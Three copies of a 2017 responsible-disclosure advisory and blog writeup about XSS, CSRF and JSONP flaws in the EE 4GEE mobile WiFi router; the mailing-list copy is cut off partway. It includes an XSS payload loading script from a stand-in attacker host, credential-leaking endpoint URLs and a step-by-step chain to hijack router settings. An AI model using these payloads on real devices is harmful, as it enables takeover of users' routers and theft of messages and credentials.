=== Content from github.com_2dabc266_20250126_071144.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesIT%2Fvuln-advisories-%2Ftree%2Fmaster%2FEE-4GEE-Multiple-Vulns)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesIT%2Fvuln-advisories-%2Ftree%2Fmaster%2FEE-4GEE-Multiple-Vulns)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=JamesIT%2Fvuln-advisories-)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[JamesIT](/JamesIT)
/
**[vuln-advisories-](/JamesIT/vuln-advisories-)**
Public

* [Notifications](/login?return_to=%2FJamesIT%2Fvuln-advisories-) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FJamesIT%2Fvuln-advisories-)
* [Star
   3](/login?return_to=%2FJamesIT%2Fvuln-advisories-)

* [Code](/JamesIT/vuln-advisories-)
* [Issues
  1](/JamesIT/vuln-advisories-/issues)
* [Pull requests
  0](/JamesIT/vuln-advisories-/pulls)
* [Actions](/JamesIT/vuln-advisories-/actions)
* [Projects
  0](/JamesIT/vuln-advisories-/projects)
* [Security](/JamesIT/vuln-advisories-/security)
* [Insights](/JamesIT/vuln-advisories-/pulse)

Additional navigation options

* [Code](/JamesIT/vuln-advisories-)
* [Issues](/JamesIT/vuln-advisories-/issues)
* [Pull requests](/JamesIT/vuln-advisories-/pulls)
* [Actions](/JamesIT/vuln-advisories-/actions)
* [Projects](/JamesIT/vuln-advisories-/projects)
* [Security](/JamesIT/vuln-advisories-/security)
* [Insights](/JamesIT/vuln-advisories-/pulse)

## Files

 master
## Breadcrumbs

1. [vuln-advisories-](/JamesIT/vuln-advisories-/tree/master)
/
# EE-4GEE-Multiple-Vulns

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/JamesIT/vuln-advisories-/commits/master/EE-4GEE-Multiple-Vulns) master
## Breadcrumbs

1. [vuln-advisories-](/JamesIT/vuln-advisories-/tree/master)
/
# EE-4GEE-Multiple-Vulns

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/JamesIT/vuln-advisories-/tree/master) | | |
| [CSRF](/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns/CSRF "CSRF") | | [CSRF](/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns/CSRF "CSRF") |  |  |
| [XSS](/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns/XSS "XSS") | | [XSS](/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns/XSS "XSS") |  |  |
| [README.md](/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/README.md "README.md") | | [README.md](/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/README.md "README.md") |  |  |
| View all files | | |

## [README.md](#readme)

## EE 4GEE Wireless Router - Multiple Security Vulnerabilities Advisory

**Hardware Version/Model:** 4GEE WiFi MBB (EE60VB-2AE8G83).

**Vulnerable Software Version:** EE60\_00\_05.00\_25.

**Patched Software Version:** EE60\_00\_05.00\_31.

**Product URL:** <https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi/details>

**Proof of Concept Writeup:** <https://blog.jameshemmings.co.uk/2017/08/24/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities-writeup/#more-276>

**Disclosure Timeline:**

27th July, 2017 at 21:32 GMT. Email sent with technical vulnerability information and PoC.

27th July, 2017 at 22:00 GMT. Response from EE devices manager, confirming receipt of PoC.

31th July, 2017 at 18:47 GMT. Update from vendor, patches being developed for reported issues.

1st August, 2017 at 10:43 GMT. Reply sent to vendor.

10th August, 2017 at 10:32 GMT. Update from vendor, patches still being developed.

18th August, 2017 at 12:11 GMT. Email sent to vendor asking for update/ETA.

18th August, 2017 at 12:15 GMT. Response from vendor, updates to be released on Monday.

18th August, 2017 at 12:30 GMT. Reply sent to vendor with device IMEI for online update process.

22nd August, 2017 at 15:54 GMT. Response from vendor, beta firmware released to verify changes.

23rd August, 2017 at 21:29 GMT. Reply sent to vendor, vulnerabilities successfully patched.

24th August, 2017 at 09:32 GMT. Response from vendor, patch publicly released to customers.

24th August, 2017 at 12:00 GMT. Full disclosure via Blog.

## Stored Cross Site Scripting (XSS) - SMS Messages:

**Attack Type:** Remote

**Impact:** Code Execution

**Affected Components:**
<http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox>

<http://ee.mobilebroadband/getSMSlist?rand=0.19598614685224347>

**Attack Vectors:** An attacker can exploit the vulnerability by sending a remote SMS message to the device with an XSS payload such as "<script src=<http://payload.js></script>" which is executed upon the user viewing the SMS message within the admin panel "SMS Inbox" functionality. Additionally, self-XSS can be achieved by creating an XSS payload from the device its self within a text message, which could be chained with other vulnerabilities such as CSRF.

**Vulnerability Description:**The 4GEE Mobile WiFi Router is vulnerable to Stored Cross Site Scripting (XSS) within the "sms\_content" parameter returned to the application's SMS Inbox webpage by the "getSMSlist" POST request, due to a lack of input validation and/or encoding. This exploit can be triggered by remotely sending an SMS message containing any XSS payload such as '"><script src=[http://attacker.tld/r.js></script>](http://attacker.tld/r.js%3E%3C/script%3E)' which upon clicking on the text message within the web application is successfully executed.

Additionally, due to the other vulnerabilities identified within this device, such vulnerability can be chained with Cross Site Request Forgery (CSRF) using the Stored XSS payload to send an JavaScript XHR POST request to the "uploadSettings" webpage containing binary configuration data, allowing for total modification of device settings by an attacker.

CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 7.1 - High).

**Author:** James Hemmings - security@jameshemmings.co.uk

**Reference(s)**:

[1] <https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities>

## Cross Site Request Forgery (CSRF) - Multiple:

**Attack Type:** Remote

**Impact:** Code Execution

**Affected Components:**

<http://192.168.1.1/goform/AddNewProfile?rand=0.376065695742409>

<http://192.168.1.1/goform/setWanDisconnect?rand=0.6988130822240772>

<http://192.168.1.1/goform/setSMSAutoRedirectSetting?rand=0.9003361879232169>

<http://192.168.1.1/goform/setReset?rand=0.021764703082234105>

<http://192.168.1.1/goform/uploadBackupSettings>

**Attack Vectors:** An attacker could attempt to trick users into accessing malicous CSRF payload URLs, which would allow an attacker to execute privileged functions such as device reset, device reboot, internet connection and disconnection, SMS message redirection and binary configuration file upload, which would allow modification of all device settings. Addtionally, this exploit can be chained together using other vulnerabilities discovered to be remotely exploitable over SMS, using Stored Cross Site Scripting (XSS).

**Vulnerability Description:** The 4GEE Mobile WiFi Router is vulnerable to multiple Cross Site Request Forgery (CSRF) vulnerabilities within various router administration webpages, due to the lack of robust request verification tokens within requests. An attacker could persuade an authenticated user to visit a malicous website using phishing and/or social engineering techniques to send an CSRF request to the web application, thus executing the privileged function as the authenticated user. In this case, due to the lack of authentication on certain privileged functions, authentication may not be neccessary.

The following webpages were identified to be vulnerable to Cross Site Request Forgery (CSRF) attacks:

AddNewProfile [2].

setWanDisconnect [3].

setSMSAutoRedirectSetting [4].

setReset [5].

uploadBackupSettings [6].

CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 6.8 - Medium).

**Author:** James Hemmings - security@jameshemmings.co.uk

**Reference(s):**

[1] <https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities>

[2] <https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/AddProfileCSRFXSSPoc.html>

[3] <https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFInternetDCPoC.html>

[4] <https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocRedirectSMS.html>

[5] <https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocResetDefaults.html>

[6] <https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/uploadBinarySettingsCSRFPoC.html>

## JSONP Sensitive Information Disclosure - Multiple

**Attack Type:** Remote

**Impact:** Information Disclosure

**Affected Components:**

<http://192.168.1.1/goform/getPasswordSaveInfo>

<http://192.168.1.1/goform/getSingleSMSReport?rand=0.133713371337>

<http://192.168.1.1/goform/getSingleSMS?sms_id=1&rand=0.133713371337>

<http://192.168.1.1/goform/getSMSStoreState>

<http://192.168.1.1/goform/getSMSAutoRedirectSetting>

<http://192.168.1.1/goform/getSysteminfo>

<http://192.168.1.1/goform/getUsbIP?rand=0.13371337>

**Attack Vectors:** An attacker on the local network could escalate privileges from unauthenticated user, to authenticated administrative user by accessing the saved admin credentials within the JSONP endpoint. Additionally, an attacker could access network configuration data and SMS messages without authentication.

**Vulnerability Description:** The 4GEE Mobile WiFi Router is vulnerable to multiple JSONP information disclosure vulnerabilities within various endpoints which retrieve and/or set data. The JSONP endpoints allow for unauthenticated information disclosure of sensitive configuration data, settings, administration passwords and SMS messages, due to the lack of robust and effective access control. An attacker could view such unauthenticated endpoints via the local WiFi network to gain access to the administration credentials, router configuration and/or SMS messages.

CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 8.1 - High).

**Author:** James Hemmings - security@jameshemmings.co.uk

**Reference(s):**

[1] <https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities>

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.jameshemmings.co.uk_0fd05169_20250125_072148.html ===

[>
$ cd /home/JamesIT](https://blog.jameshemmings.co.uk/)

* [Home](https://blog.jameshemmings.co.uk/)
* [Blog](https://blog.jameshemmings.co.uk/posts/)
* [About](https://blog.jameshemmings.co.uk/about/)
* [Contact](https://blog.jameshemmings.co.uk/contact/)

10 minutes

# [EE 4GEE Mobile WiFi Router - Multiple Security Vulnerabilities Writeup](https://blog.jameshemmings.co.uk/2017/08/24/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities-writeup/)

After performing security testing on the 4GEE Mobile WiFi router it was discovered to be vulnerable to several security vulnerabilities. These vulnerabilities in combination make it possible for an attacker to remotely exploit the device, which can be achieved through having a user view a crafted texted message that was sent to him.

Other attacks are also possible by misleading and/or tricking users into executing code or clicking crafted URLs to trigger multiple functions such as device reset, device reboot, device restore (malicious config), sending SMS messages or stealing device configuration information, SMS messages and any other information on the device that a user may have access to and without authentication.

Additionally, multiple JSONP information disclosures were discovered, which display the full username and password of the administrative user while unauthenticated and allow access to multiple privileged functions such as device reset, device reboot and device configuration download/upload and SMS messages stored on the device.

I’d also like to note, the responsiveness and prompt vulnerability resolution from EE, as I was expecting this issue to get ignored or swept under the carpet, like most IOT/Router vulnerabilities, however in this case constant communication was kept throughout the process and the issues resolved.

**Hardware Version/Model:** 4GEE WiFi MBB (EE60VB-2AE8G83).

**Vulnerable Software Version:** EE60\_00\_05.00\_25.

**Patched Software Version:** EE60\_00\_05.00\_31.

**Vulnerability CVE(s):** CVE-2017-14267, CVE-2017-14268, CVE-2017-14269.

**Proof of Concept Code:** <https://github.com/JamesIT/vuln-advisories-/tree/master/EE-4GEE-Multiple-Vulns>

## Attack Proof of Concept

After finding multiple security vulnerabilities, I decided to chain a number of these together to achieve device compromise remotely via SMS using Stored XSS and CSRF vulnerabilities, which clearly demonstrates the need for even low risk vulnerabilities being patched, as once other issues are found they can be used to achieve further levels of access, as I highlight below.

So firstly, I decided to create the malicious binary file that we will upload to the victim’s device, by modifying the username and password.

![](images/Attack1-1.png)

Next, I modified the device SSID and the network WPA2 key, which would deny the user access to the device, as the password and network information would have changed.

![](images/Attack2-1.png)

The binary configuration file was then saved to the attackers machine with the file name of “configure.bin”.

![](images/Attack3-1.png)

I then used the “Restore backup” option within the router administration page to intercept the  POST request and generate the needed payload for the exploit, which in this case due to the binary data was using JavaScript XHR to send the request data. Additionally, I modified the payload options to submit the request automatically.

![](images/Attack6-1.png)

The request was then saved to a text file on a remote web server as “r.js” with the HTML data stripped, thus leaving only the specific function with the XHR data intact.

![](images/Attack8.png)

Next, I then sent an SMS text message to the routers phone number with the XSS payload of ‘*">*’. The specific name of “r.js” was used, as the remote device hides data over a specific length within the SMS list page and thus would not be executed correctly.

![](images/Attack9.png)

As you can see within the screenshot below, upon viewing the SMS Inbox the remote JavaScript payload is included within the webpage, thus executing the JavaScript XHR request to upload the binary data to the ‘/goform/uploadBackupSettings’ webpage.

![](images/Attack10.png)

Finally, the device configuration was modified with the uploaded binary data thus compromising the device integrity and locking the user out of the device, which would require device reset.

![](images/Attack11.png)

The home page was then accessed, confirming the router SSID of “Hacked Router”. Additionally, other venues of exploitation, would be to change the network proxy and provider settings which would allow an attacker to perform man in the middle attacks against the device, thus compromising it’s confidentiality.

![](images/Attack12.png)

## Full Vulnerability Details

###### SMS List - Stored Cross Site Scripting (XSS)

The 4GEE SMS Inbox webpage is vulnerable to Stored Cross Site Scripting (XSS) within the “SMS\_Content” parameter retrieved by “getSMSlist”, which allows an attacker to send malicious scripts to an unsuspecting user via SMS text messages and once executed an attacker could steal user cookies, device information, SMS messages or in this specific case reset the device to an attacker’s configuration, thus completely taking control of the device and its settings.

The first step in exploiting the vulnerability was to send an XSS payload to the routers mobile phone number provided by EE, as demonstrated below.

![](images/InboxStoredXSS1.png)

The SMS viewer webpage was then opened from within the router administration panel on ‘<http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox'>.

![](images/InboxStoredXSS2.png)

Next, the response from the ‘smsList’ GET request was returned with the XSS payload data within the “sms\_content " parameter.

![](images/InboxStoredXSSResponse.png)

Finally the JavaScript payload was executed, displaying the domain context of ‘ee.mobilebroadband’.

![](images/InboxStoredXSS3.png)

###### Connections List – Stored Cross Site Scripting (XSS) & Cross Site Request Forgery (CSRF)

The 4GEE Connections List & Profile Management webpage is vulnerable to Stored Cross Site Scripting (XSS) and Cross Site Request Forgery (CSRF) within the “Name” parameter, which allows an attacker to send malicious scripts to an unsuspecting user via CSRF to then execute arbitrary JavaScript code on execution, which could then compromise sensitive SMS messages and/or data.

The first step to exploiting the vulnerability was to visit the “Profile Management webpage on ‘http://192.168.1.1/default.html#connection/profileManagement.html’ with the profile name parameter being set to ‘1’ and then sent to Burp Suite by clicking “Save”.

![](images/StoredXSS1.png)

Next, the request was sent to the CSRF PoC generator via the “Action” button. In this case, an anti-CSRF token was noted “\_TclRequestVerificationToken” in the request and was not added to the subsequent proof of concept code.

![](images/StoredXSS2.png)

The “Test in browser” option was then selected, which was successful as demonstrated in the screenshot below.

![](images/StoredXSS4.png)

Additionally, as shown below the XSS payload was triggered from the “Connection Status” page in addition to the “Profile Management” webpage.

![](images/StoredXSS3.png)

###### Restore Configuration – Cross Site Request Forgery (CSRF)

The 4GEE configuration restore functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for an attacker to specify and upload a malicious binary configuration file that once uploaded, restores to the uploaded configuration. The application should implement robust refer header checking and/or anti-CSRF tokens that prevent the request when not sent with such requests.

The first step was to intercept the “uploadBackupSettings” webpage using Burp Suite and then send such request to CSRF PoC generator using the “Action” tab.

![](images/RestoreCSRF2.png)

The payload was then automatically set to XHR and the option to “Test in browser” was selected to verify the vulnerability and it’s exploit vector.

![](images/RestoreCSRF3.png)

Finally, the option to “Submit request” was selected from the webpage, with the subsequent request being captured in Burp Suite, showing the context and refer of “http://burp”.

![](images/RestoreCSRF4.png)

As shown below, the binary configuration data was uploaded to the device causing it reboot.

![](images/RestoreCSRF5.png)

###### SMS Redirection – Cross Site Request Forgery (CSRF)

The 4GEE SMS Forwarding functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks within the “SMS Forwarding” web page, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for the redirection of any received SMS message once a user clicks a specially crafted URL or background script. The application should implement robust refer header checking and/or anti-CSRF tokens that prevent the request when not sent with such requests.

The first step was to visit the *‘http://192.168.1.1/default.html#sms/smsForwarding.html’* webpage, with my mobile phone number then being entered into the “Mobile Phone Number” input field.

![](images/SMSRedir_1.png)

Next, the “Apply” button was selected and the request intercepted within Burp Suite. Notice the presence of the “\_TclRequestVerificationToken”, which in this case will be removed within the proof of concept, by sending the request to CSRF PoC generator as shown below.

![](images/SMSRedir_2.png)

The “Test in browser” option was then selected from the CSRF PoC generator screen, with the request then being submitted and intercepted within Burp Suite. As demonstrated below by the referer header and lack of anti-csrf token.

![](images/SMSRedir_3.png)

Finally, the presence of the vulnerability is confirmed by the SMS forwarding service being enabled and set to the attackers phone number, allowing an attacker to hijack all incoming SMS messages sent to the device via CSRF attacks.

![](images/SMSRedir_6.png)

###### Router Reset & Reboot – Cross Site Request Forgery (CSRF)

The 4GEE Reset/Reboot Router functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks within the “System” web page, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for the remote device reset of the 4GEE device once a user clicks a specially crafted URL or background script. The application should implement robust refer header checking and/or anti-CSRF tokens that prevent the request when not sent with such requests.

The first step was to select “Reset” from the System section of the administration panel, located on ‘http://192.168.1.1/default.html#settings/systemSetting.html’.

![](images/ResetCSRF1.png)

Next, the request was intercepted within Burp Suite and then sent to CSRF PoC generator via the “Action” button.

![](images/ResetCSRF3.png)

The option to “Test in browser” was then chosen, with the “Submit request” then being clicked, as demonstrated below  with the referer of “http://burp”.

![](images/ResetCSRF4.png)

Finally, the router reset was completed confirming the presence of such vulnerability.

![](images/ResetCSRF6.png)

###### Internet Connect/Disconnect – Cross Site Request Forgery (CSRF)

The 4GEE Connect/Disconnect functionality is vulnerable to Cross Site Request Forgery (CSRF) attacks within the “Connection Status” web page, which can be used by an attacker to execute any “GET” or “POST” requests that are not protected, in this case it allowed for the remote disconnection of the 4GEE device once a user clicks a specially crafted URL or background script.

The “Disconnect” option was firstly selected and then intercepted within Burp Suite.

![](images/InternetDC_CSRF1.png)

Next, the request was sent to Burp Suite CSRF PoC Generator by selecting the “Action” menu.

![](images/InternetDC_CSRF2.png)

The request was then sent to “Test in browser” and the option to submit the request was chosen, as identified below.

![](images/InternetDC_CSRF3.png)

Finally, the users internet connection was disconnected.

![](images/InternetDC_CSRF5.png)

###### Multiple Unauthenticated JSONP Information Disclosures

The 4GEE router uses various JSONP endpoints to retrieve and/or set data, which are vulnerable to unauthenticated information disclosure of sensitive configuration data, settings, administration password and SMS messages/lists, such unauthenticated disclosures could be remotely retrieved using CSRF/XSS/Phishing attacks previously disclosed or via unauthorised users.

The following endpoints have been deemed to be vulnerable:

```
http://192.168.1.1/goform/getPasswordSaveInfo
http://192.168.1.1/goform/getSMSAutoRedirectSetting
http://192.168.1.1/goform/getSMSStoreState
http://192.168.1.1/goform/getSMSReportlist
http://192.168.1.1/goform/getSingleSMSReport?rand=0.133713371337
http://192.168.1.1/goform/getNetworkInfo
http://192.168.1.1/goform/getSingleSMS?sms_id=1&rand=0.133713371337
http://192.168.1.1/goform/getProfileList
http://192.168.1.1/goform/getRouterInfo
http://192.168.1.1/goform/getSimcardInfo
http://192.168.1.1/goform/getWlanInfo
http://192.168.1.1/goform/getWlanClientInfo
http://192.168.1.1/goform/getSysteminfo
http://192.168.1.1/goform/getWanInfo
http://192.168.1.1/goform/getImgInfo
http://192.168.1.1/goform/getDMZInfo
http://192.168.1.1/goform/getUsbIP?rand=0.13371337
http://192.168.1.1/goform/getUsbIP?rand=0.13371337
http://192.168.1.1/goform/getMACFilterInfo

```

After viewing various responses and requests within Burp Suite, various endpoints were accessed while not authenticated to the web application, which resulted in sensitive information being disclosed, such as the device username, password and SMS messages, as demonstrated below.

![](images/Password.png)

![](images/SMSContent.png)

## **Disclosure Timeline:**

```
27th July, 2017 at 21:32 GMT. Email sent with technical vulnerability information and PoC.
27th July, 2017 at 22:00 GMT. Response from EE devices manager, confirming receipt of PoC.
31th July, 2017 at  18:47 GMT. Update from vendor, patches being developed for reported issues.
1st August, 2017 at 10:43 GMT. Reply sent to vendor.
10th August, 2017 at 10:32 GMT. Update from vendor, patches still being developed.
18th August, 2017 at 12:11 GMT. Email sent to vendor asking for update/ETA.
18th August, 2017 at 12:15 GMT. Response from vendor, updates to be released on Monday.
18th August, 2017 at 12:30 GMT. Reply sent to vendor with device IMEI for online update process.
22nd August, 2017 at 15:54 GMT. Response from vendor, beta firmware released to verify  changes.
23rd August, 2017 at 21:29 GMT. Reply sent to vendor, vulnerabilities successfully patched.
24th August, 2017 at 09:32 GMT. Response from vendor, patch publicly released to customers.
24th August, 2017 at 12:00 GMT. Full disclosure via Blog.

```

---

[4gee](https://blog.jameshemmings.co.uk/tags/4gee/)
[4gee-wifi-mbb](https://blog.jameshemmings.co.uk/tags/4gee-wifi-mbb/)
[advisory](https://blog.jameshemmings.co.uk/tags/advisory/)
[csrf](https://blog.jameshemmings.co.uk/tags/csrf/)
[ee](https://blog.jameshemmings.co.uk/tags/ee/)
[ee60vb-2ae8gb3](https://blog.jameshemmings.co.uk/tags/ee60vb-2ae8gb3/)
[jsonp](https://blog.jameshemmings.co.uk/tags/jsonp/)
[mobile-wifi](https://blog.jameshemmings.co.uk/tags/mobile-wifi/)
[responsible-disclosure](https://blog.jameshemmings.co.uk/tags/responsible-disclosure/)
[vulnerability](https://blog.jameshemmings.co.uk/tags/vulnerability/)
[xss](https://blog.jameshemmings.co.uk/tags/xss/)

[bugbounty](https://blog.jameshemmings.co.uk/categories/bugbounty/)
[cyber-security](https://blog.jameshemmings.co.uk/categories/cyber-security/)

1923 Words

2017-08-24 01:00

---

---

[←
EE 4GEE HH70 Router Vulnerability Disclosure](https://blog.jameshemmings.co.uk/2018/10/24/ee-4gee-hh70-router-vulnerability-disclosure/)

[Azure Cloud Root Keys (Insecure Storage) - Responsible Disclosure
→](https://blog.jameshemmings.co.uk/2017/07/23/azure-cloud-root-keys-insecure-storage-responsible-disclosure/)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)
[comments powered by Disqus](https://disqus.com)

© 2021
[James Hemmings](https://blog.jameshemmings.co.uk)



=== Content from seclists.org_a3d55ff9_20250125_072147.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](53)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

![](/shared/images/nst-icons.svg#search)

# EE 4GEE Multiple Security Vulnerabilities Advisory (CSRF/Stored XSS/JSONP)

---

*From*: "James Hemmings (Security)" <security () jameshemmings co uk>

*Date*: Thu, 7 Sep 2017 19:29:22 +0100

---

```
EE 4GEE Wireless Router - Multiple Security Vulnerabilities Advisory
-------------------------------------------------
Hardware Version/Model: 4GEE WiFi MBB (EE60VB-2AE8G83).
Vulnerable Software Version: EE60_00_05.00_25.
Patched Software Version: EE60_00_05.00_31.
Product URL:
<https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi/details>

Proof of Concept Writeup:
<https://blog.jameshemmings.co.uk/2017/08/24/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities-writeup/#more-276>

Disclosure Timeline:
27th July, 2017 at 21:32 GMT. Email sent with technical vulnerability
information and PoC.
27th July, 2017 at 22:00 GMT. Response from EE devices manager,
confirming receipt of PoC.
31th July, 2017 at 18:47 GMT. Update from vendor, patches being
developed for reported issues.
1st August, 2017 at 10:43 GMT. Reply sent to vendor.
10th August, 2017 at 10:32 GMT. Update from vendor, patches still being
developed.
18th August, 2017 at 12:11 GMT. Email sent to vendor asking for update/ETA.
18th August, 2017 at 12:15 GMT. Response from vendor, updates to be
released on Monday.
18th August, 2017 at 12:30 GMT. Reply sent to vendor with device IMEI
for online update process.
22nd August, 2017 at 15:54 GMT. Response from vendor, beta firmware
released to verify changes.
23rd August, 2017 at 21:29 GMT. Reply sent to vendor, vulnerabilities
successfully patched.
24th August, 2017 at 09:32 GMT. Response from vendor, patch publicly
released to customers.
24th August, 2017 at 12:00 GMT. Full disclosure via Blog.

-------------------------------------------------
Stored Cross Site Scripting (XSS) - SMS Messages:
-------------------------------------------------
Attack Type: Remote
Impact: Code Execution
Affected Components:
<http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox>
<http://ee.mobilebroadband/getSMSlist?rand=0.19598614685224347>

Attack Vectors: An attacker can exploit the vulnerability by sending a
remote SMS message to the device with an XSS payload such as "<script
src=<http://payload.js></script>" which is executed upon the user viewing
the SMS message within the admin panel "SMS Inbox" functionality.
Additionally, self-XSS can be achieved by creating an XSS payload from
the device its self within a text message, which could be chained with
other vulnerabilities such as CSRF.

Vulnerability Description:The 4GEE Mobile WiFi Router is vulnerable to
Stored Cross Site Scripting (XSS) within the "sms_content" parameter
returned to the application's SMS Inbox webpage by the "getSMSlist" POST
request, due to a lack of input validation and/or encoding. This exploit
can be triggered by remotely sending an SMS message containing any XSS
payload such as '"><script src=<http://attacker.tld/r.js>></script>' which
upon clicking on the text message within the web application is
successfully executed.

Additionally, due to the other vulnerabilities identified within this
device, such vulnerability can be chained with Cross Site Request
Forgery (CSRF) using the Stored XSS payload to send an JavaScript XHR
POST request to the "uploadSettings" web-page containing binary
configuration data, allowing for total modification of device settings
by an attacker.

